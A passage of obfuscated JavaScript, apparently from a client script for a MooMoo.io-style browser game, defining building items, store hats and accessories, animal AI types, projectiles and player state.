      req: ["wood", 20],
      ignoreCollision: true,
      zIndex: 1,
      health: 300,
      scale: 43,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 18,
      itemAID: 34
    }, {
      age: 7,
      group: this.groups[9],
      name: "healing pad",
      desc: "standing on it will slowly heal you",
      req: ["wood", 30, "food", 10],
      ignoreCollision: true,
      healCol: 15,
      health: 400,
      colDiv: 0.7,
      scale: 45,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 19,
      itemAID: 35
    }, {
      age: 9,
      group: this.groups[10],
      name: "spawn pad",
      desc: "you will spawn here when you die but it will dissapear",
      req: ["wood", 100, "stone", 100],
      health: 400,
      ignoreCollision: true,
      spawnPoint: true,
      scale: 45,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 20,
      itemAID: 36
    }, {
      age: 7,
      group: this.groups[12],
      name: "blocker",
      desc: "blocks building in radius",
      req: ["wood", 30, "stone", 25],
      ignoreCollision: true,
      blocker: 300,
      health: 400,
      colDiv: 0.7,
      scale: 45,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 21,
      itemAID: 37
    }, {
      age: 7,
      group: this.groups[13],
      name: "teleporter",
      desc: "teleports you to a random point on the map",
      req: ["wood", 60, "stone", 60],
      ignoreCollision: true,
      teleport: true,
      health: 200,
      colDiv: 0.7,
      scale: 45,
      holdOffset: 20,
      placeOffset: -5,
      itemID: 22,
      itemAID: 38
    }];
    this.checkItem = {
      index: function (_0x3ce509, _0x156cb2) {
        if ([0, 1, 2].includes(_0x3ce509)) {
          return 0;
        } else if ([3, 4, 5].includes(_0x3ce509)) {
          return 1;
        } else if ([6, 7, 8, 9].includes(_0x3ce509)) {
          return 2;
        } else if ([10, 11, 12].includes(_0x3ce509)) {
          return 3;
        } else if ([13, 14].includes(_0x3ce509)) {
          return 5;
        } else if ([15, 16].includes(_0x3ce509)) {
          return 4;
        } else if ([17, 18, 19, 21, 22].includes(_0x3ce509)) {
          if ([13, 14].includes(_0x156cb2)) {
            return 6;
          } else {
            return 5;
          }
        } else if (_0x3ce509 == 20) {
          if ([13, 14].includes(_0x156cb2)) {
            return 7;
          } else {
            return 6;
          }
        } else {
          return undefined;
        }
      }
    };
    for (let _0x121e4f = 0; _0x121e4f < this.list.length; ++_0x121e4f) {
      this.list[_0x121e4f].id = _0x121e4f;
      if (this.list[_0x121e4f].pre) {
        this.list[_0x121e4f].pre = _0x121e4f - this.list[_0x121e4f].pre;
      }
    }
    if (typeof window !== "undefined") {
      function _0x52348f(_0x4854bc) {
        for (let _0x5adf45 = _0x4854bc.length - 1; _0x5adf45 > 0; _0x5adf45--) {
          const _0x39149a = Math.floor(Math.random() * (_0x5adf45 + 1));
          [_0x4854bc[_0x5adf45], _0x4854bc[_0x39149a]] = [_0x4854bc[_0x39149a], _0x4854bc[_0x5adf45]];
        }
        return _0x4854bc;
      }
    }
  }
}
class Objectmanager {
  constructor(_0x1caddb, _0xe3b1d4, _0x4ecd55, _0x1be04d, _0x19b064, _0x425016) {
    let _0x381e53 = Math.floor;
    let _0x5839e2 = Math.abs;
    let _0x29b6f7 = Math.cos;
    let _0x5122cf = Math.sin;
    let _0x501fb0 = Math.pow;
    let _0x3d2e62 = Math.sqrt;
    this.ignoreAdd = false;
    this.hitObj = [];
    this.disableObj = function (_0x5ca12d) {
      _0x5ca12d.active = false;
    };
    let _0xafb9d;
    this.add = function (_0x15157b, _0x27a67b, _0x290dac, _0x43a047, _0x5950d1, _0x41cf1f, _0x890e31, _0x5cdd6d, _0x2ddb8e) {
      _0xafb9d = findObjectBySid(_0x15157b);
      if (!_0xafb9d) {
        _0xafb9d = gameObjects.find(_0x25a94f => !_0x25a94f.active);
        if (!_0xafb9d) {
          _0xafb9d = new _0x1caddb(_0x15157b);
          gameObjects.push(_0xafb9d);
        }
      }
      if (_0x5cdd6d) {
        _0xafb9d.sid = _0x15157b;
      }
      _0xafb9d.init(_0x27a67b, _0x290dac, _0x43a047, _0x5950d1, _0x41cf1f, _0x890e31, _0x2ddb8e);
    };
    this.disableBySid = function (_0x5b88ff) {
      let _0x416437 = findObjectBySid(_0x5b88ff);
      if (_0x416437) {
        this.disableObj(_0x416437);
      }
    };
    this.removeAllItems = function (_0x81d5b7, _0x101775) {
      gameObjects.filter(_0x40493b => _0x40493b.active && _0x40493b.owner && _0x40493b.owner.sid == _0x81d5b7).forEach(_0xa4fe => this.disableObj(_0xa4fe));
    };
    this.checkItemLocation = function (_0x1bb920, _0x39ab06, _0x5d9a47, _0xd534f0, _0x161c97, _0x89a69b, _0x12cdfb) {
      let _0xa3000f = _0xe3b1d4.find(_0x395ee5 => _0x395ee5.active && _0x4ecd55.getDistance(_0x1bb920, _0x39ab06, _0x395ee5.x, _0x395ee5.y) < _0x5d9a47 + (_0x395ee5.blocker ? _0x395ee5.blocker : _0x395ee5.getScale(_0xd534f0, _0x395ee5.isItem)));
      if (_0xa3000f) {
        return false;
      }
      if (!_0x89a69b && _0x161c97 != 18 && _0x39ab06 >= _0x1be04d.mapScale / 2 - _0x1be04d.riverWidth / 2 && _0x39ab06 <= _0x1be04d.mapScale / 2 + _0x1be04d.riverWidth / 2) {
        return false;
      }
      return true;
    };
  }
}
function findAllianceBySid(_0x14d866) {
  if (player.team) {
    return alliancePlayers.find(_0x152038 => _0x152038 === _0x14d866);
  } else {
    return null;
  }
}
class Projectile {
  constructor(_0x1381f7, _0x4c89a2, _0x4a297c, _0x47c93d, _0x37d060, _0x3e4160, _0x3f1e11) {
    this.init = function (_0x5d71e8, _0x3dbe82, _0x57323c, _0x3f094b, _0xb59e40, _0x17efbb, _0x510739, _0x6f22bb, _0x56040f) {
      this.active = true;
      this.tickActive = true;
      this.indx = _0x5d71e8;
      this.x = _0x3dbe82;
      this.y = _0x57323c;
      this.x2 = _0x3dbe82;
      this.y2 = _0x57323c;
      this.dir = _0x3f094b;
      this.skipMov = true;
      this.speed = _0xb59e40;
      this.dmg = _0x17efbb;
      this.scale = _0x6f22bb;
      this.range = _0x510739;
      this.r2 = _0x510739;
      this.owner = _0x56040f;
    };
    this.update = function (_0x574c97) {
      if (this.active) {
        let _0x4cc592 = this.speed * _0x574c97;
        if (!this.skipMov) {
          this.x += _0x4cc592 * Math.cos(this.dir);
          this.y += _0x4cc592 * Math.sin(this.dir);
          this.range -= _0x4cc592;
          if (this.range <= 0) {
            this.x += this.range * Math.cos(this.dir);
            this.y += this.range * Math.sin(this.dir);
            _0x4cc592 = 1;
            this.range = 0;
            this.active = false;
          }
        } else {
          this.skipMov = false;
        }
      }
    };
    this.tickUpdate = function (_0x52264a) {
      if (this.tickActive) {
        let _0x141ac6 = this.speed * _0x52264a;
        if (!this.skipMov) {
          this.x2 += _0x141ac6 * Math.cos(this.dir);
          this.y2 += _0x141ac6 * Math.sin(this.dir);
          this.r2 -= _0x141ac6;
          if (this.r2 <= 0) {
            this.x2 += this.r2 * Math.cos(this.dir);
            this.y2 += this.r2 * Math.sin(this.dir);
            _0x141ac6 = 1;
            this.r2 = 0;
            this.tickActive = false;
          }
        } else {
          this.skipMov = false;
        }
      }
    };
  }
}
;
class Store {
  constructor() {
    this.hats = [{
      id: 45,
      name: "Shame!",
      dontSell: true,
      price: 0,
      scale: 120,
      desc: "hacks are for winners"
    }, {
      id: 51,
      name: "Moo Cap",
      price: 0,
      scale: 120,
      desc: "coolest mooer around"
    }, {
      id: 50,
      name: "Apple Cap",
      price: 0,
      scale: 120,
      desc: "apple farms remembers"
    }, {
      id: 28,
      name: "Moo Head",
      price: 0,
      scale: 120,
      desc: "no effect"
    }, {
      id: 29,
      name: "Pig Head",
      price: 0,
      scale: 120,
      desc: "no effect"
    }, {
      id: 30,
      name: "Fluff Head",
      price: 0,
      scale: 120,
      desc: "no effect"
    }, {
      id: 36,
      name: "Pandou Head",
      price: 0,
      scale: 120,
      desc: "no effect"
    }, {
      id: 37,
      name: "Bear Head",
      price: 0,
      scale: 120,
      desc: "no effect"
    }, {
      id: 38,
      name: "Monkey Head",
      price: 0,
      scale: 120,
      desc: "no effect"
    }, {
      id: 44,
      name: "Polar Head",
      price: 0,
      scale: 120,
      desc: "no effect"
    }, {
      id: 35,
      name: "Fez Hat",
      price: 0,
      scale: 120,
      desc: "no effect"
    }, {
      id: 42,
      name: "Enigma Hat",
      price: 0,
      scale: 120,
      desc: "join the enigma army"
    }, {
      id: 43,
      name: "Blitz Hat",
      price: 0,
      scale: 120,
      desc: "hey everybody i'm blitz"
    }, {
      id: 49,
      name: "Bob XIII Hat",
      price: 0,
      scale: 120,
      desc: "like and subscribe"
    }, {
      id: 57,
      name: "Pumpkin",
      price: 50,
      scale: 120,
      desc: "Spooooky"
    }, {
      id: 8,
      name: "Bummle Hat",
      price: 100,
      scale: 120,
      desc: "no effect"
    }, {
      id: 2,
      name: "Straw Hat",
      price: 500,
      scale: 120,
      desc: "no effect"
    }, {
      id: 15,
      name: "Winter Cap",
      price: 600,
      scale: 120,
      desc: "allows you to move at normal speed in snow",
      coldM: 1
    }, {
      id: 5,
      name: "Cowboy Hat",
      price: 1000,
      scale: 120,
      desc: "no effect"
    }, {
      id: 4,
      name: "Ranger Hat",
      price: 2000,
      scale: 120,
      desc: "no effect"
    }, {
      id: 18,
      name: "Explorer Hat",
      price: 2000,
      scale: 120,
      desc: "no effect"
    }, {
      id: 31,
      name: "Flipper Hat",
      price: 2500,
      scale: 120,
      desc: "have more control while in water",
      watrImm: true
    }, {
      id: 1,
      name: "Marksman Cap",
      price: 3000,
      scale: 120,
      desc: "increases arrow speed and range",
      aMlt: 1.3
    }, {
      id: 10,
      name: "Bush Gear",
      price: 3000,
      scale: 160,
      desc: "allows you to disguise yourself as a bush"
    }, {
      id: 48,
      name: "Halo",
      price: 3000,
      scale: 120,
      desc: "no effect"
    }, {
      id: 6,
      name: "Soldier Helmet",
      price: 4000,
      scale: 120,
      desc: "reduces damage taken but slows movement",
      spdMult: 0.94,
      dmgMult: 0.75
    }, {
      id: 23,
      name: "Anti Venom Gear",
      price: 4000,
      scale: 120,
      desc: "makes you immune to poison",
      poisonRes: 1
    }, {
      id: 13,
      name: "Medic Gear",
      price: 5000,
      scale: 110,
      desc: "slowly regenerates health over time",
      healthRegen: 3
    }, {
      id: 9,
      name: "Miners Helmet",
      price: 5000,
      scale: 120,
      desc: "earn 1 extra gold per resource",
      extraGold: 1
    }, {
      id: 32,
      name: "Musketeer Hat",
      price: 5000,
      scale: 120,
      desc: "reduces cost of projectiles",
      projCost: 0.5
    }, {
      id: 7,
      name: "Bull Helmet",
      price: 6000,
      scale: 120,
      desc: "increases damage done but drains health",
      healthRegen: -5,
      dmgMultO: 1.5,
      spdMult: 0.96
    }, {
      id: 22,
      name: "Emp Helmet",
      price: 6000,
      scale: 120,
      desc: "turrets won't attack but you move slower",
      antiTurret: 1,
      spdMult: 0.7
    }, {
      id: 12,
      name: "Booster Hat",
      price: 6000,
      scale: 120,
      desc: "increases your movement speed",
      spdMult: 1.16
    }, {
      id: 26,
      name: "Barbarian Armor",
      price: 8000,
      scale: 120,
      desc: "knocks back enemies that attack you",
      dmgK: 0.6
    }, {
      id: 21,
      name: "Plague Mask",
      price: 10000,
      scale: 120,
      desc: "melee attacks deal poison damage",
      poisonDmg: 5,
      poisonTime: 6
    }, {
      id: 46,
      name: "Bull Mask",
      price: 10000,
      scale: 120,
      desc: "bulls won't target you unless you attack them",
      bullRepel: 1
    }, {
      id: 14,
      name: "Windmill Hat",
      topSprite: true,
      price: 10000,
      scale: 120,
      desc: "generates points while worn",
      pps: 1.5
    }, {
      id: 11,
      name: "Spike Gear",
      topSprite: true,
      price: 10000,
      scale: 120,
      desc: "deal damage to players that damage you",
      dmg: 0.45
    }, {
      id: 53,
      name: "Turret Gear",
      topSprite: true,
      price: 10000,
      scale: 120,
      desc: "you become a walking turret",
      turret: {
        proj: 1,
        range: 700,
        rate: 2500
      },
      spdMult: 0.7
    }, {
      id: 20,
      name: "Samurai Armor",
      price: 12000,
      scale: 120,
      desc: "increased attack speed and fire rate",
      atkSpd: 0.78
    }, {
      id: 58,
      name: "Dark Knight",
      price: 12000,
      scale: 120,
      desc: "restores health when you deal damage",
      healD: 0.4
    }, {
      id: 27,
      name: "Scavenger Gear",
      price: 15000,
      scale: 120,
      desc: "earn double points for each kill",
      kScrM: 2
    }, {
      id: 40,
      name: "Tank Gear",
      price: 15000,
      scale: 120,
      desc: "increased damage to buildings but slower movement",
      spdMult: 0.3,
      bDmg: 3.3
    }, {
      id: 52,
      name: "Thief Gear",
      price: 15000,
      scale: 120,
      desc: "steal half of a players gold when you kill them",
      goldSteal: 0.5
    }, {
      id: 55,
      name: "Bloodthirster",
      price: 20000,
      scale: 120,
      desc: "Restore Health when dealing damage. And increased damage",
      healD: 0.25,
      dmgMultO: 1.2
    }, {
      id: 56,
      name: "Assassin Gear",
      price: 20000,
      scale: 120,
      desc: "Go invisible when not moving. Can't eat. Increased speed",
      noEat: true,
      spdMult: 1.1,
      invisTimer: 1000
    }];
    this.accessories = [{
      id: 12,
      name: "Snowball",
      price: 1000,
      scale: 105,
      xOff: 18,
      desc: "no effect"
    }, {
      id: 9,
      name: "Tree Cape",
      price: 1000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 10,
      name: "Stone Cape",
      price: 1000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 3,
      name: "Cookie Cape",
      price: 1500,
      scale: 90,
      desc: "no effect"
    }, {
      id: 8,
      name: "Cow Cape",
      price: 2000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 11,
      name: "Monkey Tail",
      price: 2000,
      scale: 97,
      xOff: 25,
      desc: "Super speed but reduced damage",
      spdMult: 1.35,
      dmgMultO: 0.2
    }, {
      id: 17,
      name: "Apple Basket",
      price: 3000,
      scale: 80,
      xOff: 12,
      desc: "slowly regenerates health over time",
      healthRegen: 1
    }, {
      id: 6,
      name: "Winter Cape",
      price: 3000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 4,
      name: "Skull Cape",
      price: 4000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 5,
      name: "Dash Cape",
      price: 5000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 2,
      name: "Dragon Cape",
      price: 6000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 1,
      name: "Super Cape",
      price: 8000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 7,
      name: "Troll Cape",
      price: 8000,
      scale: 90,
      desc: "no effect"
    }, {
      id: 14,
      name: "Thorns",
      price: 10000,
      scale: 115,
      xOff: 20,
      desc: "no effect"
    }, {
      id: 15,
      name: "Blockades",
      price: 10000,
      scale: 95,
      xOff: 15,
      desc: "no effect"
    }, {
      id: 20,
      name: "Devils Tail",
      price: 10000,
      scale: 95,
      xOff: 20,
      desc: "no effect"
    }, {
      id: 16,
      name: "Sawblade",
      price: 12000,
      scale: 90,
      spin: true,
      xOff: 0,
      desc: "deal damage to players that damage you",
      dmg: 0.15
    }, {
      id: 13,
      name: "Angel Wings",
      price: 15000,
      scale: 138,
      xOff: 22,
      desc: "slowly regenerates health over time",
      healthRegen: 3
    }, {
      id: 19,
      name: "Shadow Wings",
      price: 15000,
      scale: 138,
      xOff: 22,
      desc: "increased movement speed",
      spdMult: 1.1
    }, {
      id: 18,
      name: "Blood Wings",
      price: 20000,
      scale: 178,
      xOff: 26,
      desc: "restores health when you deal damage",
      healD: 0.2
    }, {
      id: 21,
      name: "Corrupt X Wings",
      price: 20000,
      scale: 178,
      xOff: 26,
      desc: "deal damage to players that damage you",
      dmg: 0.25
    }];
  }
}
;
class ProjectileManager {
  constructor(_0x429265, _0x442dbe, _0x137849, _0x4fb528, _0x324f14, _0xdd5534, _0x25b9a7, _0x27c3a0, _0x47c58b) {
    this.addProjectile = function (_0xff7022, _0x5adbd4, _0x1fe7bb, _0x3ede87, _0x4a7d53, _0x8afd1f, _0x152f85, _0x4f3256, _0x445496, _0x39fb1e) {
      let _0x32c654 = _0xdd5534.projectiles[_0x8afd1f];
      let _0x2fa1bc;
      for (let _0x20b487 = 0; _0x20b487 < _0x442dbe.length; ++_0x20b487) {
        if (!_0x442dbe[_0x20b487].active) {
          _0x2fa1bc = _0x442dbe[_0x20b487];
          break;
        }
      }
      if (!_0x2fa1bc) {
        _0x2fa1bc = new _0x429265(_0x137849, _0x4fb528, _0x324f14, _0xdd5534, _0x25b9a7, _0x27c3a0, _0x47c58b);
        _0x2fa1bc.sid = _0x442dbe.length;
        _0x442dbe.push(_0x2fa1bc);
      }
      _0x2fa1bc.init(_0x8afd1f, _0xff7022, _0x5adbd4, _0x1fe7bb, _0x4a7d53, _0x32c654.dmg, _0x3ede87, _0x32c654.scale, _0x152f85);
      _0x2fa1bc.ignoreObj = _0x4f3256;
      _0x2fa1bc.layer = _0x445496 || _0x32c654.layer;
      _0x2fa1bc.inWindow = _0x39fb1e;
      _0x2fa1bc.src = _0x32c654.src;
      return _0x2fa1bc;
    };
  }
}
;
class AiManager {
  constructor(_0x2496c5, _0x519e16, _0xac0632, _0x7d3e16, _0xc41715, _0x3d1367, _0x4ca46c, _0x554755, _0x2bfec6) {
    this.aiTypes = [{
      id: 0,
      src: "cow_1",
      killScore: 150,
      health: 500,
      weightM: 0.8,
      speed: 0.00095,
      turnSpeed: 0.001,
      scale: 72,
      drop: ["food", 50]
    }, {
      id: 1,
      src: "pig_1",
      killScore: 200,
      health: 800,
      weightM: 0.6,
      speed: 0.00085,
      turnSpeed: 0.001,
      scale: 72,
      drop: ["food", 80]
    }, {
      id: 2,
      name: "Bull",
      src: "bull_2",
      hostile: true,
      dmg: 20,
      killScore: 1000,
      health: 1800,
      weightM: 0.5,
      speed: 0.00094,
      turnSpeed: 0.00074,
      scale: 78,
      viewRange: 800,
      chargePlayer: true,
      drop: ["food", 100]
    }, {
      id: 3,
      name: "Bully",
      src: "bull_1",
      hostile: true,
      dmg: 20,
      killScore: 2000,
      health: 2800,
      weightM: 0.45,
      speed: 0.001,
      turnSpeed: 0.0008,
      scale: 90,
      viewRange: 900,
      chargePlayer: true,
      drop: ["food", 400]
    }, {
      id: 4,
      name: "Wolf",
      src: "wolf_1",
      hostile: true,
      dmg: 8,
      killScore: 500,
      health: 300,
      weightM: 0.45,
      speed: 0.001,
      turnSpeed: 0.002,
      scale: 84,
      viewRange: 800,
      chargePlayer: true,
      drop: ["food", 200]
    }, {
      id: 5,
      name: "Quack",
      src: "chicken_1",
      dmg: 8,
      killScore: 2000,
      noTrap: true,
      health: 300,
      weightM: 0.2,
      speed: 0.0018,
      turnSpeed: 0.006,
      scale: 70,
      drop: ["food", 100]
    }, {
      id: 6,
      name: "MOOSTAFA",
      nameScale: 50,
      src: "enemy",
      hostile: true,
      dontRun: true,
      fixedSpawn: true,
      spawnDelay: 60000,
      noTrap: true,
      colDmg: 100,
      dmg: 40,
      killScore: 8000,
      health: 18000,
      weightM: 0.4,
      speed: 0.0007,
      turnSpeed: 0.01,
      scale: 80,
      spriteMlt: 1.8,
      leapForce: 0.9,
      viewRange: 1000,
      hitRange: 210,
      hitDelay: 1000,
      chargePlayer: true,
      drop: ["food", 100]
    }, {
      id: 7,
      name: "Treasure",
      hostile: true,
      nameScale: 35,
      src: "crate_1",
      fixedSpawn: true,
      spawnDelay: 120000,
      colDmg: 200,
      killScore: 5000,
      health: 20000,
      weightM: 0.1,
      speed: 0,
      turnSpeed: 0,
      scale: 70,
      spriteMlt: 1
    }, {
      id: 8,
      name: "MOOFIE",
      src: "wolf_2",
      hostile: true,
      fixedSpawn: true,
      dontRun: true,
      hitScare: 4,
      spawnDelay: 30000,
      noTrap: true,
      nameScale: 35,
      dmg: 10,
      colDmg: 100,
      killScore: 3000,
      health: 7000,
      weightM: 0.45,
      speed: 0.0015,
      turnSpeed: 0.002,
      scale: 90,
      viewRange: 800,
      chargePlayer: true,
      drop: ["food", 1000]
    }];
    this.spawn = function (_0x14b769, _0x2c4499, _0x32dde1, _0x232b1e) {
      let _0x2bbd11 = _0x2496c5.find(_0x345cc3 => !_0x345cc3.active);
      if (!_0x2bbd11) {
        _0x2bbd11 = new _0x519e16(_0x2496c5.length, _0xc41715, _0xac0632, _0x7d3e16, _0x4ca46c, _0x3d1367, _0x554755, _0x2bfec6);
        _0x2496c5.push(_0x2bbd11);
      }
      _0x2bbd11.init(_0x14b769, _0x2c4499, _0x32dde1, _0x232b1e, this.aiTypes[_0x232b1e]);
      return _0x2bbd11;
    };
  }
}
;
class AI {
  constructor(_0x59e714, _0x324e1c, _0x56450d, _0x5eb1b9, _0x4861c0, _0x2a6e10, _0x122eaf, _0x44baf) {
    this.sid = _0x59e714;
    this.isAI = true;
    this.nameIndex = _0x4861c0.randInt(0, _0x2a6e10.cowNames.length - 1);
    this.init = function (_0x424098, _0x4ef89f, _0x507f2c, _0x10b1b5, _0x7b95ea) {
      this.x = _0x424098;
      this.y = _0x4ef89f;
      this.startX = _0x7b95ea.fixedSpawn ? _0x424098 : null;
      this.startY = _0x7b95ea.fixedSpawn ? _0x4ef89f : null;
      this.xVel = 0;
      this.yVel = 0;
      this.zIndex = 0;
      this.dir = _0x507f2c;
      this.dirPlus = 0;
      this.showName = "aaa";
      this.index = _0x10b1b5;
      this.src = _0x7b95ea.src;
      if (_0x7b95ea.name) {
        this.name = _0x7b95ea.name;
      }
      this.weightM = _0x7b95ea.weightM;
      this.speed = _0x7b95ea.speed;
      this.killScore = _0x7b95ea.killScore;
      this.turnSpeed = _0x7b95ea.turnSpeed;
      this.scale = _0x7b95ea.scale;
      this.maxHealth = _0x7b95ea.health;
      this.leapForce = _0x7b95ea.leapForce;
      this.health = this.maxHealth;
      this.chargePlayer = _0x7b95ea.chargePlayer;
      this.viewRange = _0x7b95ea.viewRange;
      this.drop = _0x7b95ea.drop;
      this.dmg = _0x7b95ea.dmg;
      this.hostile = _0x7b95ea.hostile;
      this.dontRun = _0x7b95ea.dontRun;
      this.hitRange = _0x7b95ea.hitRange;
      this.hitDelay = _0x7b95ea.hitDelay;
      this.hitScare = _0x7b95ea.hitScare;
      this.spriteMlt = _0x7b95ea.spriteMlt;
      this.nameScale = _0x7b95ea.nameScale;
      this.colDmg = _0x7b95ea.colDmg;
      this.noTrap = _0x7b95ea.noTrap;
      this.spawnDelay = _0x7b95ea.spawnDelay;
      this.hitWait = 0;
      this.waitCount = 1000;
      this.moveCount = 0;
      this.targetDir = 0;
      this.active = true;
      this.alive = true;
      this.runFrom = null;
      this.chargeTarget = null;
      this.dmgOverTime = {};
    };
    let _0x5c5ff1 = 0;
    let _0x4555d2 = 0;
    this.animate = function (_0x3a8ead) {
      if (this.animTime > 0) {
        this.animTime -= _0x3a8ead;
        if (this.animTime <= 0) {
          this.animTime = 0;
          this.dirPlus = 0;
          _0x5c5ff1 = 0;
          _0x4555d2 = 0;
        } else if (_0x4555d2 == 0) {
          _0x5c5ff1 += _0x3a8ead / (this.animSpeed * _0x2a6e10.hitReturnRatio);
          this.dirPlus = _0x4861c0.lerp(0, this.targetAngle, Math.min(1, _0x5c5ff1));
          if (_0x5c5ff1 >= 1) {
            _0x5c5ff1 = 1;
            _0x4555d2 = 1;
          }
        } else {
          _0x5c5ff1 -= _0x3a8ead / (this.animSpeed * (1 - _0x2a6e10.hitReturnRatio));
          this.dirPlus = _0x4861c0.lerp(0, this.targetAngle, Math.max(0, _0x5c5ff1));
        }
      }
    };
    this.startAnim = function () {
      this.animTime = this.animSpeed = 600;
      this.targetAngle = Math.PI * 0.8;
      _0x5c5ff1 = 0;
      _0x4555d2 = 0;
    };
  }
}
;
class Petal {
  constructor(_0x5af4f2, _0x1f858c) {
    this.x = _0x5af4f2;
    this.y = _0x1f858c;
    this.damage = 10;
    this.health = 10;
    this.maxHealth = this.health;
    this.active = false;
    this.alive = false;
    this.timer = 1500;
    this.time = 0;
    this.damaged = 0;
    this.alpha = 1;
    this.scale = 9;
    this.visScale = this.scale;
  }
}
;
class addCh {
  constructor(_0x69b4a1, _0x464f00, _0x17a7e0, _0x49306d) {
    this.x = _0x69b4a1;
    this.y = _0x464f00;
    this.alpha = 0;
    this.active = true;
    this.alive = false;
    this.chat = _0x17a7e0;
    this.owner = _0x49306d;
  }
}
;
class DeadPlayer {
  constructor(_0x11b6ea, _0x62c31c, _0x14bec5, _0x32a56d, _0x12930e, _0x20c491, _0x56abb0, _0x3aa57a, _0x5b1d50) {
    this.x = _0x11b6ea;
    this.y = _0x62c31c;
    this.lastDir = _0x14bec5;
    this.dir = _0x14bec5 + Math.PI;
    this.buildIndex = _0x32a56d;
    this.weaponIndex = _0x12930e;
    this.weaponVariant = _0x20c491;
    this.skinColor = _0x56abb0;
    this.scale = _0x3aa57a;
    this.visScale = 0;
    this.name = _0x5b1d50;
    this.alpha = 1;
    this.active = true;
    this.animate = function (_0x48b4a4) {
      let _0xae583c = UTILS.getAngleDist(this.lastDir, this.dir);
      if (_0xae583c > 0.01) {
        this.dir += _0xae583c / 20;
      } else {
        this.dir = this.lastDir;
      }
      if (this.visScale < this.scale) {
        this.visScale += _0x48b4a4 / (this.scale / 2);
        if (this.visScale >= this.scale) {
          this.visScale = this.scale;
        }
      }
      this.alpha -= _0x48b4a4 / 30000;
      if (this.alpha <= 0) {
        this.alpha = 0;
        this.active = false;
      }
    };
  }
}
;
class Player {
  constructor(_0x2eeb97, _0x3e1a59, _0x213a18, _0xbcb40b, _0x8626c0, _0xde909d, _0x2e4e0e, _0x503fc2, _0x597b44, _0x3a9115, _0x481216, _0x28971d, _0x2c5854, _0x361c64) {
    this.id = _0x2eeb97;
    this.sid = _0x3e1a59;
    this.tmpScore = 0;
    this.team = null;
    this.latestSkin = 0;
    this.oldSkinIndex = 0;
    this.skinIndex = 0;
    this.latestTail = 0;
    this.oldTailIndex = 0;
    this.tailIndex = 0;
    this.hitTime = 0;
    this.lastHit = 0;
    this.showName = "NOOO";
    this.tails = {};
    for (let _0xb86658 = 0; _0xb86658 < _0x481216.length; ++_0xb86658) {
      if (_0x481216[_0xb86658].price <= 0) {
        this.tails[_0x481216[_0xb86658].id] = 1;
      }
    }
    this.skins = {};
    for (let _0x55cfc0 = 0; _0x55cfc0 < _0x3a9115.length; ++_0x55cfc0) {
      if (_0x3a9115[_0x55cfc0].price <= 0) {
        this.skins[_0x3a9115[_0x55cfc0].id] = 1;
      }
    }
    this.points = 0;
    this.dt = 0;
    this.hidden = false;
    this.itemCounts = {};
    this.isPlayer = true;
    this.pps = 0;
    this.moveDir = undefined;
    this.skinRot = 0;
    this.lastPing = 0;
    this.iconIndex = 0;
    this.skinColor = 0;
    this.dist2 = 0;
    this.aim2 = 0;
    this.maxSpeed = 1;
    this.chat = {
      message: null,
      count: 0
    };
    this.backupNobull = true;
    this.circle = false;
    this.circleRad = 200;
    this.circleRadSpd = 0.1;
    this.cAngle = 0;
    this.spawn = function (_0x5998fb) {
      this.attacked = false;
      this.timeDamaged = 0;
      this.timeHealed = 0;
      this.pinge = 0;
      this.millPlace = "NOOO";
      this.lastshamecount = 0;
      this.death = false;
      this.spinDir = 0;
      this.sync = false;
      this.antiBull = 0;
      this.bullTimer = 0;
      this.poisonTimer = 0;
      this.active = true;
      this.alive = true;
      this.lockMove = false;
      this.lockDir = false;
      this.minimapCounter = 0;
      this.chatCountdown = 0;
      this.shameCount = 0;
      this.shameTimer = 0;
      this.sentTo = {};
      this.gathering = 0;
      this.gatherIndex = 0;
      this.shooting = {};
      this.shootIndex = 9;
      this.autoGather = 0;
      this.animTime = 0;
      this.animSpeed = 0;
      this.mouseState = 0;
      this.buildIndex = -1;
      this.weaponIndex = 0;
      this.weaponCode = 0;
      this.weaponVariant = 0;
      this.primaryIndex = undefined;
      this.secondaryIndex = undefined;
      this.dmgOverTime = {};
      this.noMovTimer = 0;
      this.maxXP = 300;
      this.XP = 0;
      this.age = 1;
      this.kills = 0;
      this.upgrAge = 2;
      this.upgradePoints = 0;
      this.x = 0;
      this.y = 0;
      this.oldXY = {
        x: 0,
        y: 0
      };
      this.zIndex = 0;
      this.xVel = 0;
      this.yVel = 0;
      this.slowMult = 1;
      this.dir = 0;
      this.dirPlus = 0;
      this.targetDir = 0;
      this.targetAngle = 0;
      this.maxHealth = 100;
      this.health = this.maxHealth;
      this.oldHealth = this.maxHealth;
      this.damaged = 0;
      this.scale = _0x213a18.playerScale;
      this.speed = _0x213a18.playerSpeed;
      this.resetMoveDir();
      this.resetResources(_0x5998fb);
      this.items = [0, 3, 6, 10];
      this.weapons = [0];
      this.shootCount = 0;
      this.weaponXP = [];
      this.reloads = {
        0: 0,
        1: 0,
        2: 0,
        3: 0,
        4: 0,
        5: 0,
        6: 0,
        7: 0,
        8: 0,
        9: 0,
        10: 0,
        11: 0,
        12: 0,
        13: 0,
        14: 0,
        15: 0,
        53: 0
      };
      this.bowThreat = {
        9: 0,
        12: 0,
        13: 0,
        15: 0
      };
      this.damageThreat = 0;
      this.inTrap = false;
      this.canEmpAnti = false;
      this.empAnti = false;
      this.soldierAnti = false;
      this.poisonTick = 0;
      this.bullTick = 0;
      this.setPoisonTick = false;
      this.setBullTick = false;
      this.antiTimer = 2;
    };
    this.resetMoveDir = function () {
      this.moveDir = undefined;
    };
    this.resetResources = function (_0x399a2c) {
      for (let _0x383ad1 = 0; _0x383ad1 < _0x213a18.resourceTypes.length; ++_0x383ad1) {
        this[_0x213a18.resourceTypes[_0x383ad1]] = _0x399a2c ? 100 : 0;
      }
    };
    this.getItemType = function (_0x4843d2) {
      let _0x527424 = this.items.findIndex(_0x401041 => _0x401041 == _0x4843d2);
      if (_0x527424 != -1) {
        return _0x527424;
      } else {
        return _0x597b44.checkItem.index(_0x4843d2, this.items);
      }
    };
    this.setData = function (_0x4b8fa0) {
      this.id = _0x4b8fa0[0];
